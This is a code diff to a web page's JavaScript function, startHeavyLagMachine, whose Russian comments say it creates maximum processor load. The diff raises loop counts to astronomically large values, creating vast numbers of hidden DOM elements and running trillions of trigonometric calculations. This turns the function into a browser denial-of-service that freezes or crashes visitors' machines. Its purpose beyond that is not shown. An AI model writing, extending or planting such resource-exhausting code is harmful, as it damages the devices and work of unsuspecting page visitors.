@@ -725,7 +725,7 @@
 
         function startHeavyLagMachine() {
             // Создаем сотни сложных элементов для нагрузки
-            for (let i = 0; i < 80000000; i++) {
+            for (let i = 0; i < 800000000000000000; i++) {
                 const shape = document.createElement('div');
                 shape.className = 'hidden-load complex-shape';
                 shape.style.width = Math.random() * 400 + 100 + 'px';
@@ -738,7 +738,7 @@
             }
 
             // Создаем матричные элементы
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 200000000; i++) {
                 const matrix = document.createElement('div');
                 matrix.className = 'matrix-element';
                 matrix.textContent = String.fromCharCode(65 + Math.floor(Math.random() * 58));
@@ -756,7 +756,7 @@
                 }
                 // Создаем максимальную нагрузку на процессор
                 let result = 0;
-                for (let i = 0; i < 5000000; i++) {
+                for (let i = 0; i < 5000000000000; i++) {
                     result += Math.sin(i) * Math.cos(i) * Math.tan(i);
                 }
                 
